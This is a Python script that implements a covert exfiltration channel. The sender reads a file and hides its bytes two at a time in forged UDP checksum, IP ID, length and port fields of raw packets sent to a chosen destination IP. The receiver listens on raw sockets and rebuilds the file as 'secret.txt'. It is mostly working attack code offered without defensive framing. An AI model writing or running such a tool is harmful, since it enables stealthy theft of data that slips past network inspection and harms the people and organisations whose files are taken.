import socket
import struct
import time

DEST_PORT = 9999  # filter by expected dst_port value (== total_chunks)

REAL_UDP_LEN = 12  # 8 byte header + 4 byte dummy payload

CHUNK_SIZE = 2  # bytes per packet (fits in manipulated fields)

FLAG_DATA = 0
FLAG_ACK = 1
FLAG_START = 2
FLAG_END = 3


def parse_covert_packet(raw, target_port):
    ip = raw[:20]
    udp = raw[20:28]

    iph = struct.unpack("!BBHHHBBH4s4s", ip)
    udph = struct.unpack("!HHHH", udp)

    ip_id = iph[3]

    src_port, dst_port, length, checksum = udph

    if dst_port != target_port:
        return None

    flag = src_port
    seq = ip_id
    total = length

    data = struct.pack("!H", checksum)

    return flag, seq, total, data


def receive_file(outfile, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)

    chunks = {}
    total = None

    print("[*] Listening...")

    while True:

        raw, addr = s.recvfrom(65535)

        pkt = parse_covert_packet(raw, port)
        if pkt is None:
            continue

        flag, seq, pkt_total, data = pkt

        if flag == FLAG_START:
            total = pkt_total
            print(f"[*] expecting {total} packets")

        elif flag == FLAG_DATA:
            chunks[seq] = data

        elif flag == FLAG_END:
            break

    result = b''.join(chunks[i] for i in sorted(chunks))

    with open(outfile, "wb") as f:
        f.write(result)

    print("[+] file reconstructed")


def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff


def build_ip_header(src_ip, dst_ip, seq, payload_len):
    ver_ihl = (4 << 4) + 5
    tos = 0
    tot_len = 20 + payload_len
    pkt_id = seq
    frag = 0
    ttl = 64
    proto = socket.IPPROTO_UDP

    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)

    hdr = struct.pack("!BBHHHBBH4s4s",
                      ver_ihl, tos, tot_len, pkt_id,
                      frag, ttl, proto, 0, src, dst)

    chk = checksum(hdr)

    return struct.pack("!BBHHHBBH4s4s",
                       ver_ihl, tos, tot_len, pkt_id,
                       frag, ttl, proto, chk, src, dst)


def build_covert_udp(data, flag, dest_port, total):
    payload = b'\x00' * 4
    udp_len = 8 + len(payload)

    src_port = flag
    dst_port = dest_port

    covert_len = total
    covert_chk = struct.unpack("!H", data.ljust(2, b'\x00'))[0]

    return struct.pack("!HHHH",
                       src_port,
                       dst_port,
                       covert_len,
                       covert_chk
                       ) + payload


def send_file(filepath, src_ip, dst_ip, port):

    with open(filepath,'rb') as f:
        data = f.read()

    chunks = [data[i:i+CHUNK_SIZE] for i in range(0,len(data),CHUNK_SIZE)]
    total = len(chunks)

    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    print(f"[*] sending {total} packets")

    start = build_ip_header(src_ip,dst_ip,0,12) + \
            build_covert_udp(b'\x00\x00', FLAG_START, port, total)

    s.sendto(start,(dst_ip,0))

    for seq,chunk in enumerate(chunks,1):

        ip_hdr = build_ip_header(src_ip,dst_ip,seq,12)
        udp_hdr = build_covert_udp(chunk,FLAG_DATA,port,total)

        s.sendto(ip_hdr+udp_hdr,(dst_ip,0))

        time.sleep(0.01)

    end = build_ip_header(src_ip,dst_ip,total+1,12) + \
          build_covert_udp(b'\x00\x00',FLAG_END,port,total)

    s.sendto(end,(dst_ip,0))

    print("[+] transfer complete")

receive_file("./secret.txt", 9999)